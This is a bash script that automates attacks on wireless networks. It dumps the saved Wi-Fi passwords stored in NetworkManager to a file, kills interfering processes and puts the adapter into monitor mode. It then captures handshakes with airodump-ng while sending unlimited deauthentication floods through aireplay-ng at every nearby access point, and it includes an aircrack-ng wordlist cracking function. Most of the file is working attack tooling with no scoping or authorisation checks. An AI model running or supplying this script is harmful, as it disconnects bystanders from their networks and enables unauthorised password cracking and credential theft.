#!/bin/bash

function check_nmcli () {
	nmcli &> /dev/null
	status=$(echo $?)
	if [[ status -ne 0 ]]; then
		systemctl start NetworkManager.service
		modprobe -r iwlmvm && modprobe iwlmvm
	fi
}

function dirInit () {
	if [[ -d "cracker" ]];then
		if [[ -L "cracker" ]]; then
			rm -rf cracker
		fi
		rm -rf cracker
	fi
	mkdir cracker
}

function mkSubDir () {
	if [[ $# -ne 1 ]]; then
		echo "Usuage: $0 <ap>"
		exit 1
	fi

	if [[ -d "cracker/$ap" ]];then
		if [[ -L "cracker/$ap" ]]; then
			rm -rf "cracker/$ap"
		fi
		rm -rf "cracker/$ap"
	fi
	mkdir -p "cracker/$ap"
}

# metadata means you will have bssid, ssid, channel, and security of APs saved in <file: aval_APs> 
function APmetadata () {
	# nmcli heps us list APs info with certain filtering or fields with -f option 
	nmcli -f SSID dev wifi list | tail -n +2 | sed '/^-- *$/d' >> "cracker/toCrack"
}

# return password if it is correct, else return empty string, if usuage not match return 1 
function getPass () {
	if [[ $# -ne 1 ]]; then
		echo "Usuage: $0 <ap>"
		exit 1
	fi

	ap="$1"
	pass=$(nmcli -s -g 802-11-wireless-security.psk connection show "$ap" 2> /dev/null)

	# this part will verify password but cant rely, the purpose of doing additional check is just to reduce no. of APs to attack, if already password correctly cached, it is not necessary to attack, you MAY BE PROMPTED FOR PASSWORD IF YOU ARE RUNNING THIS SCRIPT IN GUI BASED PLATFORM
	# check if password is correct or incorrect (this is not reliable but worth it)
	if [[ -n "$pass" ]]; then
		# you can do with wpa_supplicant but hey for better time managemet, increase in wait time will give more reliable, but could slow our attack
		waitTime=2
		nmcli --wait $waitTime dev wifi connect "$ap" &> /dev/null
		if [[ $? -eq 0 ]]; then
			echo "$pass" # correct password
			return 0
		else
			return 2 # password incorrect or waitTime expires
		fi
	fi
}

# known_APs are such which password your devices already known of 
function known_APs () {
	declare -A known_password
	# nmcli again comes to rescue use to find the name of AP which currently we are connected to, this is of course known AP
	current_AP=$(nmcli -t -f ACTIVE,SSID dev wifi | grep '^yes' | cut -d ':' -f 2)

	if [[ -n "$current_AP" ]]; then
		# to get pass in ssh session, sudo required 
		current_pass=$(nmcli -s -g 802-11-wireless-security.psk connection show "$current_AP")
		known_password["$current_AP"]+="$current_pass"
	fi

	# known AP will not stop here because, your device may have saved passwords from previous connection and they are still connectable meaning passwords are unchanged 
	# first create direcotry to store files required in crack 
	nmcli -t -f NAME,TYPE connection | grep wireless | cut -d ':' -f 1 > "cracker/previously_connected_APs"

	# read each AP from file *APs* and try to connect
	{
		while read ap; do
	  		if [[ -n "$ap" && "$ap" != "$current_AP" ]]; then
	  			# as device can store incorrect/previous password, getPass function will only return correct password, so we can say that pass is only the correct one, incorrect password means empty value 
	  			pass=$(getPass "$ap")
	  			if [[ -n "$pass" && "$pass" != 1 ]]; then
	  				known_password["$ap"]+="$pass"
	  			fi
	  		fi
		done <"cracker/previously_connected_APs"

		# print found credentials
		echo FoundPasswords:
		for ap in "${!known_password[@]}";do
			echo "${ap}:${known_password["$ap"]}" | tee -a "cracker/found_credentials"
		done

		# network may be disconnected, reconnect to previous AP
		# if [[ "$current_AP" && "$current_pass" ]]; then
		# 	nmcli dev wifi connect "$current_AP" "$current_pass" &> /dev/null
		# fi

		unset ap pass
	}
}

# ....................................DANGER FUNCTIONS...............................

function getMainAdapter_Name () {
	# no need to echo because the following commands will already print first wireless adapter 
	iw dev | awk '/Interface/ {print $2}'
	# can also be achived with 
	# nmcli -t dev st | grep "wifi:" | awk -F ':' '{print $1}'
}

function getAdapterType () {
	# this will print 'managed', 'monitor' or some other modes in stdout, this will probably be assigned to some variable at the caller function 
	local adapter_name=$(getMainAdapter_Name)
	iw dev "adapter_name" info | grep type | cut -f 2 -d ' '
	unset adapter_name
}

# this will take AP name as arg, it is because we will monitor that particular AP to attack, according to the name of AP we will get its info and try and attack
function enableMonitorMode () {
	if [[ $# -ne 1 ]]; then
		echo "Function Usuage: $0 <channelNumber>"
		exit 1
	fi
	adapter=$(getMainAdapter_Name)
	echo "Killing all process that could interfere mon mode for '$adapter' ...." &> /dev/null
	(
		airmon-ng check kill &> /dev/null
		airmon-ng start "$adapter" "$channel" &> /dev/null
		if [[ $? -eq 0 ]]; then
			echo "Monitor mode enabled...At '$adapter'" &> /dev/null
			return 0
		fi
		echo "Monitor mode start failed...Aborting"
		exit 1
	)
}

function getAP () {
	if [[ $# -ne 1 ]]; then
		echo "Usuage: $0 <lineWithSSID>"
		exit 1
	fi

	# well it can access line from caller, but it is not always the case that caller will have line so, we have to pass arg and the first arg is consider as the line which will have ssid somewhere 
	line="$1" 
	awk -F: '{print $7}' <<< "$line"
}

function getMacAP () {
	if [[ $# -ne 1 ]]; then
		echo "Function Usuage: $0 <lineWithMacAP>"
		exit 1
	fi
	line="$1"
	# you can supply variable for awk to program with <<< operator, if you don't sed you will get output that contains '\:' at the end of each field of mac address so you should replace that '\:' with just ':'
	# this is assigned in some vaiable at caller function
	awk -F: '{print $1":"$2":"$3":"$4":"$5":"$6}' <<< "$line" | sed 's/\\:/:/g'
}

function getChannel () {
	if [[ $# -ne 1 ]]; then
		echo "Function Usuage: $0 <lineWithChannelNumber>"
		exit 1
	fi
	line="$1"
	# you can supply variable for awk to program with <<< operator, if you don't sed you will get output that contains '\:' at the end of each field of mac address so you should replace that '\:' with just ':'
	awk -F: '{print $8}' <<< "$line"
}

function wordlist_attack () {
	if [[ $# -ne 1 ]]; then
		echo "Function Usuage: $0 <cap_file>"
		exit 1
	fi
	# --new-session current.session
	find . -type f -name "*.cap" -exec aircrack-ng -l "cracker/keys" -w "wrdlists/wifite.txt" '{}' +
}

function add_APs_toCrack () {
	# add access points to crack  
	nmcli -t -f BSSID,SSID,CHAN,SECURITY dev wifi list > "cracker/toCrack"
	# this will ensure no duplicate APs are in our list
	awk '!seen[$0]++' "cracker/toCrack" > output.txt && mv output.txt "cracker/toCrack"
}

function capture_deauth () {
	if [[ $# -ne 4 ]]; then
		echo "Function Usuage: $0 <bssid> <channel> <adapter> <ap>"
		exit 1
	fi
	bssid="$1"
	channel="$2"
	adapter="$3"
	ap="$4"

	cap_file="$ap"	
	# start captuing 
	mkSubDir "$cap_file"
	airodump-ng -c "$channel" --band abg --bssid "$bssid" -w "cracker/$cap_file/$cap_file" "$adapter" > "cracker/$cap_file/logHandshake" 2> "cracker/$cap_file/errlog" &
	pid_capture=$!

	# start duauth attack
	aireplay-ng --deauth 0 -a "$bssid" "$adapter" &> /dev/null &
	pid_deauth=$!

	timetoWait=60 # default wait for handshake is 60 seconds aka 1 minute
	end_timer=$((SECONDS+timetoWait))
	# wait for handshake or wait till timeout 
	while [[ end_timer -ge SECONDS ]]; do
		if grep "Handshake" "cracker/$cap_file/logHandshake" &> /dev/null; then
			echo timeUP
			break
		fi
	done

	# kill the entrire grouped pids, kill $pid_capture won't work because the grouped commands may have different pid
	kill "$pid_capture" 
	kill "$pid_deauth"
	echo ...

}

# continue from here 
function start () {
	# new file to be generated cracker/toCrack before starting of crack
	add_APs_toCrack # this will give use list and info of AP in file cracker/toCrack field seperated by :
	# adapter=$(getMainAdapter_Name)
	# if [[ $(getAdapterType) == "managed" ]]; then
	# 	adapter="${adapter}mon"
	# fi

	exec 3< "cracker/toCrack"
	# reading each line and parsing for each required part 
	while IFS='' read -r line <&3 || [[ -n "$line" ]]; do
		# echo "$line"
		ap=$(getAP "$line")

		# it can be empty if our nmcli could not get ssid 
		if [[ -z "$ap" ]] || grep ^"$ap:" "cracker/found_credentials" &> /dev/null; then
			# if it is empty, you can go find ssid process but for now we will skip empty ssid 
			# skip if credentials is already found
			echo skipped-"$ap"
			continue
		fi

		# get mac of AP if AP is not hidden/empty and channel too
		bssid=$(getMacAP "$line")
		channel=$(getChannel "$line")
		echo "$bssid - $channel - $ap"
		enableMonitorMode "$channel"
		adapter=$(getMainAdapter_Name)
		capture_deauth "$bssid" "$channel" "$adapter" "$ap"
		# echo yomalo

	done 
	# done < "cracker/toCrack"
	exec 3<&-
	echo $? 

	# everything ready, throw wordlist against captured EAPOL and test your luck
	# wordlist_attack
}

# work with cracker/toCrack
# this part NOW DANGEROUS, your card will be in *MONITOR MODE*, WE WILL USE `aircrack-ng` suite, maybe `mdk3` to DEAUTH and so on.

# ........................................MAIN FUNCTION................................
function main () {
	# make nmcli ready first 
	check_nmcli
	# collect APmetadata that will be saved on cracker/aval_APs
	dirInit
	# collect knwon APs and unknown will be saved on cracker/toCrack
	known_APs
	# start attacking, deauthenticating, capturing, wordlistattack
	start
	echo lol
}

# ....................................START CALLING...........................................
if [[ $UID -ne 0 ]]; then
	echo run as root
	exit 1
fi
main
# wait



